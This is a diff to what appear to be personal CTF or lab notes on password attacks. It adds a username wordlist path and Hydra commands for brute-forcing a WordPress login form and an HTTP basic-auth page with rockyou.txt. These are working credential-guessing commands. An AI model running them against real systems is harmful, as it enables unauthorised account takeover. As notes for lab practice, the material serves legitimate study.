@@ -1,8 +1,14 @@
 # Attacks
 
+## username list
+
+remember there's a username list on `/usr/share/wordlists/dirb/others/names.txt`
+
 ## Hydra
 
 ### Basics
+
+#### http-post
 
 A standard attack looks like: 
 
@@ -14,6 +20,14 @@ An example of an attack made towards a wordpress site eg. looked like this:
 hydra $RHOST -l Elliot -P fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username"
 ```
 (For this particular box, we were given a file `fsocity.dic` to use for fuzzing)
+
+#### http-get
+
+If a website itself has password protection when you access it, note that it is looking in the Authorization header looking for something on the form `admin:password` (base64 encoded).
+This can be attacked with hydra with the following command:
+```
+hydra $RHOST -l admin -P /usr/share/wordlists/rockyou.txt http-get / 
+```
 
 ## WordPress
 
